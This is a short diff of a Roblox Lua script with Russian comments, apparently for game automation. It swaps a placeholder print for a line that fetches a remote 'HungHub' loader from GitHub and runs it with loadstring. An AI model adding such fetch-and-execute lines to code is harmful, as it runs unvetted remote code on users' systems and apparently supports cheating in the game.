@@ -3,8 +3,8 @@ local Players = game:GetService("Players")
 local player = Players.LocalPlayer
 local TeleportService = game:GetService("TeleportService")
 placeId = 116495829188952
--- Первое сообщение
-print("sdsd")
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/hungquan99/HungHub/main/loader.lua"))()
 wait(5)
 
 -- Функция для отслеживания смерти
